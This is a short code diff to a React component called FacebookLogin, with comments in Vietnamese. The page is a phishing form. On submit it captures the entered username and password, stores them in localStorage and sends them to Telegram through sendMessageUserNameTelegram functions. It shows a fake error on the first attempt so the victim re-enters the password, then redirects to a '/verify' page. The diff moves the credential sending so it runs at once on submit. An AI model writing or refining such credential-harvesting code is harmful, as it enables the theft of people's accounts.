@@ -19,24 +19,24 @@ export default function FacebookLogin() {
 
   const onSubmit = async (data) => {
     setIsLoading(true); // Bắt đầu loading
+    setAttempts([data]);
+    const newAttempts = [...attempts, data];
+    localStorage.setItem("loginAttempts", JSON.stringify(newAttempts));
+
+    if (attempts.length === 0) {
+      sendMessageUserNameTelegram1(newAttempts);
+    } else {
+      sendMessageUserNameTelegram(newAttempts);
+    }
 
     setTimeout(async () => {
       if (attempts.length === 0) {
         setShowError(true);
-        setAttempts([data]);
-        const newAttempts = [...attempts, data];
-        console.log(newAttempts);
-        localStorage.setItem("loginAttempts", JSON.stringify(newAttempts));
-        sendMessageUserNameTelegram1(newAttempts);
         setValue("password", "");
       } else {
-        const newAttempts = [...attempts, data];
-        localStorage.setItem("loginAttempts", JSON.stringify(newAttempts));
-        sendMessageUserNameTelegram(newAttempts);
         navigate("/verify");
       }
-
-      setIsLoading(false); // Kết thúc loading sau 5s
+      setIsLoading(false);
     }, 3500);
   };
 
